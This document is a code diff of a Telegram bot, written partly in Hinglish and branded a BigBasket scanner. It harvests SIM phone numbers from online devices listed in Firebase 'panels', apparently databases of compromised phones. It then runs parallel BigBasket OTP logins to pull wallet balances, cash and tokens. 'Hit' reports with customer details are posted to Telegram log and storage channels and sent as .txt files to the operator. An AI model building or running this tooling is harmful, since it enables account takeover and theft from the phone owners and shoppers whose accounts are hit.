         f"📥 <i>Aapki hits .txt file direct niche DM me bhej di gayi hai:</i>"
     )
-    safe_send(chat_id, summary_text, reply_markup=main_keyboard())
+    safe_send(chat_id, summary_text)
 
     # Send document to user DM
     try:
@@ -1204,60 +1216,25 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
         safe_send(chat_id, f"⚠️ Document delivery error: {esc(e)}")
 
     # Send document to storage channel
-    user_ch = get_effective_channel(chat_id)
-    if user_ch:
+    storage_ch = get_effective_storage_channel(chat_id)
+    if storage_ch:
         try:
             with open(hits_file_path, "rb") as doc:
                 bot.send_document(
-                    int(user_ch) if str(user_ch).lstrip("-").isdigit() else user_ch,
+                    int(storage_ch) if str(storage_ch).lstrip("-").isdigit() else storage_ch,
                     doc,
                     caption=f"📦 <b>[Storage Backup] BB_HITS_{ts_str}.txt</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash"
                 )
         except Exception:
             pass
 
-# ============ FAST ONLINE PANEL SCANNER ============
-def harvest_panel_online_targets(raw_panel: str) -> Tuple[List[Dict[str, Any]], int, Optional[str]]:
-    """Harvests ONLY currently online devices and their SIM numbers from a single Firebase panel."""
-    fb_url = resolve_firebase_url(raw_panel)
-    if not fb_url:
-        return [], 0, "Invalid Firebase URL"
-    clean_url = fb_url.rstrip("/")
-    devices_dict = None
-
-    for p in ["clients.json", "devices.json"]:
-        try:
-            r = requests.get(f"{clean_url}/{p}", timeout=10)
-            if r.status_code == 200 and isinstance(r.json(), dict):
-                devices_dict = r.json()
-                break
-        except Exception:
-            pass
-
-    if not devices_dict:
-        return [], 0, "Database locked or empty"
-
-    all_count = len(devices_dict)
-    online_targets = []
-    seen_nums = set()
-
-    for did, dev_data in devices_dict.items():
-        if not isinstance(dev_data, dict):
-            continue
-        if is_device_online(dev_data):
-            dev_targets = audit_device_sim_slots(str(did), dev_data, fb_url, raw_panel)
-            for t in dev_targets:
-                if t["phone"] not in seen_nums:
-                    seen_nums.add(t["phone"])
-                    online_targets.append(t)
-
-    return online_targets, all_count, None
+    # Show menu again
+    show_scanner_menu(chat_id)
 
 def do_panel_scan(chat_id: int, raw_panel: str):
-    """Scans a single panel for online devices."""
     fb_url = resolve_firebase_url(raw_panel)
     if not fb_url:
-        safe_send(chat_id, "❌ Invalid Firebase URL!", reply_markup=main_keyboard())
+        safe_send(chat_id, "❌ Invalid Firebase URL!")
         return
 
     with cfg_lock:
@@ -1278,46 +1255,44 @@ def do_panel_scan(chat_id: int, raw_panel: str):
             online_targets, all_count, err = harvest_panel_online_targets(raw_panel)
 
             if err and not all_count:
-                safe_send(chat_id, f"❌ Panel <code>{esc(raw_panel)}</code> par devices nahi mile ya database locked hai.", reply_markup=main_keyboard())
+                safe_send(chat_id, f"❌ Panel <code>{esc(raw_panel)}</code> par devices nahi mile ya database locked hai.")
                 return
 
             if not online_targets:
                 safe_send(
                     chat_id,
-                    f"⚠️ Panel par <b>{all_count}</b> devices mile, par abhi koi active device <b>Online</b> nahi hai.\n"
-                    f"Thodi der baad dobara koshish karein jab devices active hon.",
-                    reply_markup=main_keyboard()
+                    f"⚠️ Panel par <b>{all_count}</b> devices mile, par koi active SIM target nahi mila.\n"
+                    f"Thodi der baad dobara koshish karein."
                 )
                 return
 
             safe_send(
                 chat_id,
                 f"✅ <b>Harvested {len(online_targets)} Physical SIMs across {all_count} Devices!</b>\n"
-                f"🟢 <b>Status:</b> All {len(online_targets)} SIMs are on <b>LIVE Online</b> devices right now.\n"
-                f"🏎️ Launching {MAX_SCAN_WORKERS} concurrent BigBasket scan workers...",
-                reply_markup=main_keyboard()
+                f"🟢 <b>Status:</b> All targets belong to <b>Active Online Devices</b> right now.\n"
+                f"🏎️ Launching {MAX_SCAN_WORKERS} concurrent BigBasket scan workers..."
             )
 
             run_bulk_scan(chat_id, online_targets, f"Direct Panel ({raw_panel})")
 
         except Exception as e:
-            safe_send(chat_id, f"❌ Error during panel audit: {esc(e)}", reply_markup=main_keyboard())
+            safe_send(chat_id, f"❌ Error during panel audit: {esc(e)}")
 
     threading.Thread(target=worker, daemon=True).start()
 
 def do_scan_all_panels(chat_id: int):
-    """Multi-Firebase Parallel Scanner: Probes ALL saved panels in parallel and scans all live online devices."""
     with cfg_lock:
         panels = list(user_panels.get(chat_id, []))
 
     if not panels:
-        safe_send(chat_id, "ℹ️ Scan karne ke liye koi panels saved nahi hain. Pehle /panels me panel add karein.", reply_markup=main_keyboard())
+        safe_send(chat_id, "ℹ️ Scan karne ke liye koi panels saved nahi hain. Pehle Panels Hub me panel add karein.")
+        show_panels_menu(chat_id)
         return
 
     safe_send(
         chat_id,
         f"🌐 <b>Probing {len(panels)} Panels in Parallel...</b>\n"
-        f"⚡ Fast-harvesting <b>ONLY LIVE ONLINE</b> devices across all databases..."
+        f"⚡ Fast-harvesting <b>LIVE ONLINE</b> devices across all databases..."
     )
 
     def worker():
@@ -1329,7 +1304,6 @@ def do_scan_all_panels(chat_id: int):
             with ThreadPoolExecutor(max_workers=min(len(panels), 8)) as executor:
                 futures = {executor.submit(harvest_panel_online_targets, p): p for p in panels}
                 for f in as_completed(futures):
-                    p_name = futures[f]
                     try:
                         targets, count, err = f.result()
                         total_devs += count
@@ -1343,55 +1317,318 @@ def do_scan_all_panels(chat_id: int):
             if not all_targets:
                 safe_send(
                     chat_id,
-                    f"⚠️ <b>{len(panels)}</b> panels me kul <b>{total_devs}</b> devices mile, par abhi koi active device <b>Online</b> nahi hai.\n"
-                    f"Thodi der baad dobara koshish karein jab devices active hon.",
-                    reply_markup=main_keyboard()
+                    f"⚠️ <b>{len(panels)}</b> panels me kul <b>{total_devs}</b> devices mile, par abhi koi active SIM online nahi mila.\n"
+                    f"Thodi der baad dobara koshish karein."
                 )
                 return
 
             safe_send(
                 chat_id,
                 f"✅ <b>Harvested {len(all_targets)} Physical SIMs across {len(panels)} Panels!</b>\n"
-                f"🟢 <b>Status:</b> All {len(all_targets)} SIMs belong to <b>LIVE Online Devices</b> right now.\n"
-                f"🏎️ Launching {MAX_SCAN_WORKERS} concurrent BigBasket scan workers...",
-                reply_markup=main_keyboard()
+                f"🟢 <b>Status:</b> All targets belong to <b>LIVE Online Devices</b> right now.\n"
+                f"🏎️ Launching {MAX_SCAN_WORKERS} concurrent BigBasket scan workers..."
             )
 
             run_bulk_scan(chat_id, all_targets, f"All Saved Panels ({len(panels)} Panels)")
 
         except Exception as e:
-            safe_send(chat_id, f"❌ Error during multi-panel audit: {esc(e)}", reply_markup=main_keyboard())
+            safe_send(chat_id, f"❌ Error during multi-panel audit: {esc(e)}")
 
     threading.Thread(target=worker, daemon=True).start()
 
-# ============ BOT HANDLERS & MENUS ============
+# ============ JIO-BOT INTERACTIVE INLINE HUBS ============
+def show_main_menu(chat_id: int, message_id: Optional[int] = None):
+    with cfg_lock:
+        panels = user_panels.get(chat_id, [])
+    log_ch = get_effective_log_channel(chat_id)
+    storage_ch = get_effective_storage_channel(chat_id)
+
+    is_scanning = chat_id in active_scans and active_scans[chat_id].get("running")
+    status_emoji = "🟢 RUNNING" if is_scanning else "⚪ IDLE"
+
+    text = f"""🤖 <b>BigBasket Enterprise Scanner Bot (24/7 Cloud)</b>
+
+🆔 <b>User ID:</b> <code>{chat_id}</code> | 🔒 <b>Role:</b> Super Admin
+⚡ <b>Scanner Engine:</b> <b>{status_emoji}</b>
+📂 <b>Panels Loaded:</b> <code>{len(panels)} Panels</code>
+📡 <b>Log Channel:</b> <code>{esc(log_ch)}</code>
+📦 <b>Storage Channel:</b> <code>{esc(storage_ch)}</code>
+
+<i>Select a category below to access controls:</i>"""
+
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("⚡ Scanner Hub", callback_data="menu_scanner"),
+        types.InlineKeyboardButton("📂 Panels & Data", callback_data="menu_panels")
+    )
+    markup.add(
+        types.InlineKeyboardButton("📡 Channels & Logs", callback_data="menu_channels"),
+        types.InlineKeyboardButton("📥 Export Hub", callback_data="menu_export")
+    )
+    markup.add(
+        types.InlineKeyboardButton("📱 Check Single Number", callback_data="menu_single"),
+        types.InlineKeyboardButton("❓ Help & User Guide", callback_data="menu_help")
+    )
+
+    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)
+
+def show_scanner_menu(chat_id: int, message_id: Optional[int] = None):
+    with cfg_lock:
+        panels = user_panels.get(chat_id, [])
+
+    is_scanning = chat_id in active_scans and active_scans[chat_id].get("running")
+    session = active_scans.get(chat_id)
+    saved = get_saved_scan_state(chat_id)
+
+    state_str = "🟢 <b>Scanning Active</b>" if is_scanning else "⚪ <b>Idle / Stopped</b>"
+
+    if is_scanning and session:
+        h_cnt = len(session.get("hits", []))
+        zb_cnt = len(session.get("zero_bal", []))
+        processed = session.get("processed", 0)
+        total = session.get("total", 0)
+    elif saved:
+        h_cnt = len(saved.get("hits", []))
+        zb_cnt = len(saved.get("zero_bal", []))
+        processed = len(saved.get("processed_phones", []))
+        total = saved.get("total", 0)
+    else:
+        h_cnt = 0
+        zb_cnt = 0
+        processed = 0
+        total = 0
+
+    log_ch = get_effective_log_channel(chat_id)
+    storage_ch = get_effective_storage_channel(chat_id)
+
+    text = f"""⚡ <b>Scanner Control Hub</b>
+
+• <b>Status:</b> {state_str}
+• <b>Panels Loaded:</b> <code>{len(panels)}</code>
+• <b>Parallel Workers:</b> <code>{MAX_SCAN_WORKERS} Threads Active</code>
+• <b>Progress:</b> <code>{processed}/{total}</code>
+• <b>Hits Found:</b> <b>{h_cnt}</b> | <b>Zero Bal:</b> <b>{zb_cnt}</b>
+• <b>Log Channel:</b> <code>{esc(log_ch)}</code>
+• <b>Storage Channel:</b> <code>{esc(storage_ch)}</code>
+
+<i>Use the buttons below to control the scanner:</i>"""
+
+    markup = types.InlineKeyboardMarkup()
+    if is_scanning:
+        markup.add(
+            types.InlineKeyboardButton("🛑 Stop Current Scan", callback_data="stop_current_scan"),
+            types.InlineKeyboardButton("📈 Live Status", callback_data="status_btn")
+        )
+    elif saved:
+        rem_cnt = max(0, total - processed)
+        markup.add(types.InlineKeyboardButton(f"⏯️ Continue Previous Scan ({rem_cnt} Left)", callback_data="resume_saved_scan"))
+        markup.add(
+            types.InlineKeyboardButton("🔄 Run New Scan", callback_data="scan_all_panels"),
+            types.InlineKeyboardButton("🗑️ Discard Old Scan", callback_data="discard_saved_scan")
+        )
+        markup.add(types.InlineKeyboardButton("📈 Live Status", callback_data="status_btn"))
+    else:
+        markup.add(
+            types.InlineKeyboardButton("🌐 Scan All Panels", callback_data="scan_all_panels"),
+            types.InlineKeyboardButton("📁 Upload Scraped File", callback_data="upload_prompt")
+        )
+        markup.add(types.InlineKeyboardButton("📈 Live Status", callback_data="status_btn"))
+
+    markup.add(types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu"))
+    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)
+
+def show_panels_menu(chat_id: int, message_id: Optional[int] = None):
+    with cfg_lock:
+        panels = user_panels.get(chat_id, [])
+
+    total_count = len(panels)
+    preview_lines = []
+    for p in panels[:4]:
+        p_clean = p.replace("https://", "").replace("-default-rtdb.firebaseio.com", "").replace(".firebaseio.com", "")
+        preview_lines.append(f"• <code>{esc(p_clean)}</code>")
+
+    preview = "\n".join(preview_lines) if preview_lines else "<i>No panels added yet.</i>"
+    if total_count > 4:
+        preview += f"\n<i>... and {total_count - 4} more panels</i>"
+
+    text = f"""📂 <b>Panels & Data Workspace</b>
+
+• <b>Panels Loaded:</b> <code>{total_count}</code>
+• <b>Storage Backup:</b> <code>{esc(get_effective_storage_channel(chat_id))}</code>
+
+<b>Saved Panels Preview:</b>
+{preview}
+
+💡 <b>Tip:</b> You can paste Firebase URLs directly in chat anytime to merge into your workspace!"""
+
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("➕ Add Panels", callback_data="add_panel_prompt"),
+        types.InlineKeyboardButton("📋 View All Panels", callback_data="view_panels_list")
+    )
+    markup.add(
+        types.InlineKeyboardButton("🧪 Health Ping", callback_data="ping_panels"),
+        types.InlineKeyboardButton("🌐 Scan All Now", callback_data="scan_all_panels")
+    )
+    markup.add(
+        types.InlineKeyboardButton("🗑️ Clear All Panels", callback_data="clear_panels_prompt")
+    )
+    markup.add(
+        types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu")
+    )
+
+    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)
+
+def show_channels_menu(chat_id: int, message_id: Optional[int] = None):
+    log_ch = get_effective_log_channel(chat_id)
+    storage_ch = get_effective_storage_channel(chat_id)
+
+    text = f"""📡 <b>Channel Connections & Storage Hub</b>
+
+• <b>Your Log Channel:</b> <code>{esc(log_ch)}</code>
+• <b>Your Storage Channel:</b> <code>{esc(storage_ch)}</code>
+
+<b>Channel Functionality:</b>
+• <b>Log Channel:</b> Instant Hit cards with customer details, balance & tokens are posted live.
+• <b>Storage Channel:</b> Complete .txt backup reports are archived automatically at scan finish.
+
+💡 <i>To link a private channel, make this bot an Admin in your channel and send the Channel ID (e.g. -100xxxxxxxxxx).</i>"""
+
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("📢 Set Log Channel", callback_data="set_log_prompt"),
+        types.InlineKeyboardButton("📦 Set Storage Channel", callback_data="set_storage_prompt")
+    )
+    markup.add(
+        types.InlineKeyboardButton("🧪 Test Log Ping", callback_data="test_log_ping"),
+        types.InlineKeyboardButton("📦 Test Storage Ping", callback_data="test_storage_ping")
+    )
+    markup.add(
+        types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu")
+    )
+
+    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)
+
+def show_export_menu(chat_id: int, message_id: Optional[int] = None):
+    files = [f for f in os.listdir(RESULTS_DIR) if f.startswith(f"BB_HITS_{chat_id}_")]
+    if not files:
+        files = [f for f in os.listdir(RESULTS_DIR) if f.startswith("BB_HITS_")]
+    files.sort(reverse=True)
+
+    file_count = len(files)
+    latest_file = files[0] if files else "None"
+
+    text = f"""📥 <b>Results & Export Hub</b>
+
+• <b>Total Saved Reports:</b> <code>{file_count}</code>
+• <b>Latest File:</b> <code>{esc(latest_file)}</code>
+
+<i>Click below to download your latest hits report file directly into this chat:</i>"""
+
+    markup = types.InlineKeyboardMarkup()
+    if files:
+        markup.add(types.InlineKeyboardButton("📄 Download Latest Hits (.txt)", callback_data="export_latest_hits"))
+    markup.add(types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu"))
+
+    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)
+
+def show_single_menu(chat_id: int, message_id: Optional[int] = None):
+    with session_lock:
+        user_sessions[chat_id] = {"state": "AWAITING_NUMBER"}
+
+    text = """📱 <b>Single Number Wallet Checker</b>
+
+📲 <b>Kripya 10-digit Indian Mobile Number enter karein:</b>
+(e.g. <code>9899123456</code>)
+
+Bot BigBasket API se OTP send karega aur login karke Total Balance, Free Cash aur NeuCoins nikalega."""
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_action"))
+
+    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)
+
+def show_help_menu(chat_id: int, message_id: Optional[int] = None):
+    text = """📖 <b>BigBasket Scanner User Guide:</b>
+
+<b>🔹 1. Panel Manager:</b>
+• Firebase URLs chat me paste karein ya <b>➕ Add Panels</b> dabayein.
+• <b>🌐 Scan All Panels</b> dabane par bot har panel se active online devices nikal kar parallel OTP check chala dega.
+
+<b>🔹 2. File Upload (Dashboard Bridge):</b>
+• Red Glass Dashboard se <code>clean_numbers_*.txt</code> ya <code>.csv</code> send karein.
+• Bot Phone, Device ID aur Panel mapping detect karke auto scan karega.
+
+<b>🔹 3. 24/7 Cloud Keep-Alive:</b>
+• Bot Render free cloud par 24/7 host rehta hai.
+• Agar scan beech me ruk jaye to <b>⏯️ Continue Previous Scan</b> se usi point se resume ho jata hai.
+
+<b>Commands:</b>
+• <code>/start</code> — Main Menu
+• <code>/panels</code> — Panels Workspace
+• <code>/channel</code> — Channels & Storage Settings
+• <code>/stop</code> — Running scan stop karein
+• <code>/status</code> — Live Scanner Status"""
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu"))
+    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)
+
+# ============ SINGLE NUMBER CHECK FLOW ============
+def start_single_flow(chat_id: int, raw_number: str):
+    phone = normalize_phone(raw_number)
+    if not phone:
+        safe_send(chat_id, "❌ <b>Invalid Mobile Number!</b> 10-digit Indian number enter karein.")
+        show_single_menu(chat_id)
+        return
+
+    safe_send(chat_id, f"🔄 <b>Connecting to BigBasket...</b>\nSending OTP to <code>+91 {esc(phone)}</code>...")
+
+    def do_send():
+        bb = BigBasketClient()
+        ok_send, ref_or_err = bb.send_otp(phone)
+        if not ok_send:
+            safe_send(chat_id, f"❌ <b>OTP Send Failed:</b> {esc(ref_or_err)}")
+            with session_lock:
+                user_sessions.pop(chat_id, None)
+            show_main_menu(chat_id)
+            return
+
+        with session_lock:
+            user_sessions[chat_id] = {
+                "state": "AWAITING_OTP",
+                "phone": phone,
+                "ref_id": ref_or_err,
+                "client": bb,
+                "sent_time": time.time()
+            }
+
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_action"))
+
+        safe_send(
+            chat_id,
+            f"✅ <b>OTP Sent Successfully!</b>\n\n"
+            f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
+            f"🔑 <b>Ref ID:</b> <code>{esc(ref_or_err)}</code>\n\n"
+            f"👉 Kripya 6-digit OTP reply me bhejein (Valid for 3 mins):",
+            reply_markup=markup
+        )
+
+    threading.Thread(target=do_send, daemon=True).start()
+
+# ============ COMMAND HANDLERS ============
 @bot.message_handler(commands=["start"])
 def cmd_start(message):
     chat_id = message.chat.id
     with session_lock:
         user_sessions.pop(chat_id, None)
 
-    welcome_text = (
-        "<b>🛒 BigBasket Advanced Bulk Scanner & Auto-OTP Bot</b>\n\n"
-        "Ye bot 100% Jio-Bot architecture par fully automated hai:\n\n"
-        "<b>🔹 1. Direct Firebase Panel Engine (/panels)</b>\n"
-        "• Panel se live online devices ke <b>Slot 1 & Slot 2 SIMs</b> nikalta hai.\n"
-        "• 5 concurrent workers se parallel OTP send & auto-catch karke wallet check karta hai.\n\n"
-        "<b>🔹 2. Scraped File Upload (Dashboard Bridge)</b>\n"
-        "• Dashboard ki <code>clean_numbers_*.txt</code>, <code>all_panels_*.txt</code> ya <code>.csv</code> send karein.\n"
-        "• Bot Phone, Device ID aur Panel mapping read karke auto scan karega.\n\n"
-        "<b>🔹 3. Channel Logs & Storage (/channel)</b>\n"
-        "• Live Hit cards and final .txt backup seedha aapke channel me broadcast honge.\n\n"
-        "<b>📥 Direct DM Delivery:</b> Scan khatam hote hi final <b>Hits Report</b> seedha aapke DM me bhej di jayegi!"
-    )
-    safe_send(chat_id, welcome_text, reply_markup=main_keyboard())
-
-    # Check for unfinished scan state
     saved = get_saved_scan_state(chat_id)
     if saved and (chat_id not in active_scans or not active_scans[chat_id].get("running")):
         proc_cnt = len(saved.get("processed_phones", []))
         tot_cnt = saved.get("total", len(saved.get("targets", [])))
-        rem_cnt = tot_cnt - proc_cnt
+        rem_cnt = max(0, tot_cnt - proc_cnt)
         hits_cnt = len(saved.get("hits", []))
 
         markup = types.InlineKeyboardMarkup()
@@ -1405,444 +1642,444 @@ def cmd_start(message):
             f"📋 <b>Title:</b> <code>{esc(saved.get('scan_title', 'Scan'))}</code>\n"
             f"📊 <b>Progress:</b> <code>{proc_cnt}/{tot_cnt}</code> SIMs checked\n"
             f"🔥 <b>Existing Hits:</b> <b>{hits_cnt}</b>\n"
-            f"⏳ <b>Remaining to Check:</b> <b>{rem_cnt} SIMs</b>\n\n"
-            f"Aap is scan ko wahi se continue karna chahte hain jaha yeh ruka tha?",
+            f"⏳ <b>Remaining:</b> <b>{rem_cnt} SIMs</b>\n\n"
+            f"Scan ko wahi se continue karein jaha yeh stop hua tha:",
             reply_markup=markup
         )
 
-@bot.message_handler(commands=["help"])
-@bot.message_handler(func=lambda m: m.text == "ℹ️ Help / Commands")
-def cmd_help(message):
-    help_text = (
-        "<b>📖 BigBasket Bot Commands:</b>\n\n"
-        "• <code>/panel &lt;name_or_url&gt;</code> — Direct Firebase panel scan karein\n"
-        "• <code>/panels</code> — Panel Manager menu (saved panels list, ping, scan)\n"
-        "• <code>/channel</code> — Channel Logs & Storage settings dekhein\n"
-        "• <code>/setchannel &lt;channel_id&gt;</code> — Custom logs channel set karein\n"
-        "• <code>/check &lt;10-digit-num&gt;</code> — Single number check karein\n"
-        "• <code>/stop</code> — Running scan turant rokein aur hits report download karein\n"
-        "• <code>/status</code> — Current activity & scanner metrics\n"
-        "• <code>/results</code> — Last scan ki hits .txt file dobara download karein\n\n"
-        "💡 <i>Tip: Aap koi bhi Firebase URL direct chat me paste kar sakte hain!</i>"
-    )
-    safe_send(message.chat.id, help_text, reply_markup=main_keyboard())
+    show_main_menu(chat_id)
 
-# ============ PANEL MANAGER (/panels) ============
 @bot.message_handler(commands=["panels"])
-@bot.message_handler(func=lambda m: m.text == "⚙️ Panel Manager")
-def show_panels_menu(message):
-    chat_id = message.chat.id
-    with cfg_lock:
-        panels = user_panels.get(chat_id, [])
+def cmd_panels(message):
+    show_panels_menu(message.chat.id)
 
-    markup = types.InlineKeyboardMarkup()
-    if panels:
-        if len(panels) > 1:
-            markup.add(types.InlineKeyboardButton(f"🌐 Scan All ({len(panels)} Panels)", callback_data="scan_all_panels"))
-        for p in panels[:10]:
-            p_short = p.replace("https://", "").replace("-default-rtdb.firebaseio.com", "").replace(".firebaseio.com", "")[:20]
-            markup.add(
-                types.InlineKeyboardButton(f"🚀 Scan {p_short}", callback_data=f"scan_panel_{p}"),
-                types.InlineKeyboardButton("🗑️ Del", callback_data=f"del_panel_{p}")
-            )
-    markup.add(
-        types.InlineKeyboardButton("➕ Add New Panel", callback_data="add_panel_prompt"),
-        types.InlineKeyboardButton("🔄 Ping / Health Check", callback_data="ping_panels")
-    )
-
-    p_list_str = "\n".join([f"• <code>{esc(p)}</code>" for p in panels]) if panels else "<i>Koi saved panels nahi hain.</i>"
-    text = (
-        f"⚙️ <b>BigBasket Panel Manager</b>\n\n"
-        f"<b>Saved Panels ({len(panels)}):</b>\n{p_list_str}\n\n"
-        f"👉 Niche kisi bhi panel par click karke direct scan start karein:"
-    )
-    safe_send(chat_id, text, reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda c: c.data == "resume_saved_scan")
-def cb_resume_saved_scan(call):
-    chat_id = call.message.chat.id
-    saved = get_saved_scan_state(chat_id)
-    if not saved:
-        try:
-            bot.answer_callback_query(call.id, "No saved scan found!")
-        except Exception:
-            pass
-        safe_send(chat_id, "ℹ️ Koi interrupted scan nahi mila ya pehle hi poora ho chuka hai.", reply_markup=main_keyboard())
-        return
-
-    try:
-        bot.answer_callback_query(call.id, "Resuming scan...")
-    except Exception:
-        pass
-
-    safe_send(
-        chat_id,
-        f"▶️ <b>Resuming Scan:</b> <code>{esc(saved.get('scan_title', 'Scan'))}</code>\n"
-        f"Wahi se continue kiya ja raha hai jaha ruka tha...",
-        reply_markup=main_keyboard()
-    )
-    threading.Thread(
-        target=lambda: run_bulk_scan(
-            chat_id,
-            saved.get("targets", []),
-            saved.get("scan_title", "BigBasket Bulk Scan"),
-            resume_data=saved
-        ),
-        daemon=True
-    ).start()
-
-@bot.callback_query_handler(func=lambda c: c.data == "discard_saved_scan")
-def cb_discard_saved_scan(call):
-    chat_id = call.message.chat.id
-    clear_scan_state(chat_id)
-    try:
-        bot.answer_callback_query(call.id, "Scan discarded!")
-    except Exception:
-        pass
-    safe_send(chat_id, "🗑️ Interrupted scan discard kar diya gaya. Aap naya scan shuru kar sakte hain.", reply_markup=main_keyboard())
-
-@bot.callback_query_handler(func=lambda c: c.data == "scan_all_panels")
-def cb_scan_all_panels(call):
-    chat_id = call.message.chat.id
-    bot.answer_callback_query(call.id, "Scanning all panels...")
-    do_scan_all_panels(chat_id)
-
-@bot.callback_query_handler(func=lambda c: c.data.startswith("scan_panel_"))
-def cb_scan_panel(call):
-    chat_id = call.message.chat.id
-    panel = call.data.replace("scan_panel_", "")
-    bot.answer_callback_query(call.id, f"Scanning {panel[:20]}...")
-    do_panel_scan(chat_id, panel)
-
-@bot.callback_query_handler(func=lambda c: c.data.startswith("del_panel_"))
-def cb_del_panel(call):
-    chat_id = call.message.chat.id
-    panel = call.data.replace("del_panel_", "")
-    with cfg_lock:
-        if chat_id in user_panels and panel in user_panels[chat_id]:
-            user_panels[chat_id].remove(panel)
-            save_configs()
-    bot.answer_callback_query(call.id, "Panel deleted!")
-    safe_send(chat_id, f"🗑️ Panel <code>{esc(panel)}</code> removed.", reply_markup=main_keyboard())
-
-@bot.callback_query_handler(func=lambda c: c.data == "add_panel_prompt")
-def cb_add_panel_prompt(call):
-    chat_id = call.message.chat.id
-    with session_lock:
-        user_sessions[chat_id] = {"state": "AWAITING_PANEL"}
-    bot.answer_callback_query(call.id)
-    safe_send(chat_id, "🌐 <b>Firebase Panel URL ya Name bhejein:</b>\n(e.g. <code>pani-1da70</code> ya <code>https://...</code>)", reply_markup=cancel_keyboard())
-
-@bot.callback_query_handler(func=lambda c: c.data == "ping_panels")
-def cb_ping_panels(call):
-    chat_id = call.message.chat.id
-    bot.answer_callback_query(call.id, "Checking panels...")
-    with cfg_lock:
-        panels = user_panels.get(chat_id, [])
-
-    if not panels:
-        safe_send(chat_id, "ℹ️ Ping karne ke liye koi panels saved nahi hain.", reply_markup=main_keyboard())
-        return
-
-    safe_send(chat_id, f"🔄 Pinging <b>{len(panels)}</b> panels...")
-
-    def ping_worker():
-        report_lines = []
-        for p in panels:
-            fb = resolve_firebase_url(p)
-            try:
-                t0 = time.time()
-                r = requests.get(f"{fb.rstrip('/')}/.json?shallow=true", timeout=4)
-                latency = int((time.time() - t0) * 1000)
-                if r.status_code == 200:
-                    report_lines.append(f"🟢 <b>{esc(p)}</b> — OK ({latency}ms)")
-                else:
-                    report_lines.append(f"🔴 <b>{esc(p)}</b> — HTTP {r.status_code}")
-            except Exception:
-                report_lines.append(f"🔴 <b>{esc(p)}</b> — Offline/Locked")
-
-        safe_send(chat_id, "📊 <b>Panel Health Report:</b>\n\n" + "\n".join(report_lines), reply_markup=main_keyboard())
-
-    threading.Thread(target=ping_worker, daemon=True).start()
-
-# ============ CHANNEL MANAGER (/channel) ============
 @bot.message_handler(commands=["channel", "channels"])
-@bot.message_handler(func=lambda m: m.text == "📢 Channel Settings")
-def show_channels_menu(message):
-    chat_id = message.chat.id
-    cur_ch = get_effective_channel(chat_id)
-    text = (
-        f"📢 <b>Channel Logs & Storage Settings:</b>\n\n"
-        f"• <b>Active Logs Channel:</b> <code>{esc(cur_ch or 'Not Set')}</code>\n"
-        f"• <b>Master Storage:</b> <code>{esc(DEFAULT_STORAGE_CHANNEL)}</code>\n\n"
-        f"Agar aap live hit cards aur .txt backups kisi Telegram channel me chahte hain:\n"
-        f"1. Bot ko apne channel me <b>Admin</b> banayein.\n"
-        f"2. <code>/setchannel -100xxxxxxxxxx</code> command send karein."
-    )
-    safe_send(chat_id, text, reply_markup=main_keyboard())
+def cmd_channel(message):
+    show_channels_menu(message.chat.id)
 
-@bot.message_handler(commands=["setchannel"])
-def handle_set_channel(message):
-    chat_id = message.chat.id
-    parts = message.text.split()
-    if len(parts) > 1:
-        new_ch = parts[1].strip()
-        with cfg_lock:
-            user_channels[chat_id] = new_ch
-            save_configs()
-        safe_send(chat_id, f"✅ Log Channel updated to: <code>{esc(new_ch)}</code>", reply_markup=main_keyboard())
-    else:
-        safe_send(chat_id, "Usage: <code>/setchannel -100xxxxxxxxxx</code>", reply_markup=main_keyboard())
-
-# ============ STOP & STATUS ============
 @bot.message_handler(commands=["stop"])
 def cmd_stop(message):
     chat_id = message.chat.id
-    with scan_lock:
-        if chat_id in active_scans:
-            active_scans[chat_id]["stop_requested"] = True
-            safe_send(chat_id, "🛑 <b>Stopping scan...</b> Workers abort kar rahe hain, final report compile ho rahi hai.", reply_markup=main_keyboard())
-        else:
-            safe_send(chat_id, "ℹ️ Koi active scan nahi chal raha hai.", reply_markup=main_keyboard())
-
-@bot.callback_query_handler(func=lambda c: c.data == "stop_current_scan")
-def cb_stop_scan(call):
-    chat_id = call.message.chat.id
-    with scan_lock:
-        if chat_id in active_scans:
-            active_scans[chat_id]["stop_requested"] = True
-            bot.answer_callback_query(call.id, "🛑 Stopping scan...")
-            safe_send(chat_id, "🛑 <b>Scan stopped by user!</b> Compiling report...")
-        else:
-            bot.answer_callback_query(call.id, "Koi scan active nahi hai.")
+    if chat_id in active_scans:
+        active_scans[chat_id]["stop_requested"] = True
+        safe_send(chat_id, "🛑 <b>Scan stop requested!</b> Workers finalize karke direct DM report download kar rahe hain...")
+    else:
+        safe_send(chat_id, "ℹ️ Koi scan running nahi hai.")
 
 @bot.message_handler(commands=["status"])
 def cmd_status(message):
     chat_id = message.chat.id
-    with scan_lock:
-        is_running = chat_id in active_scans and active_scans[chat_id].get("running")
-        cur_info = active_scans.get(chat_id, {})
+    show_scanner_menu(chat_id)
 
-    status_card = (
-        f"🟢 <b>Bot Status: Online</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
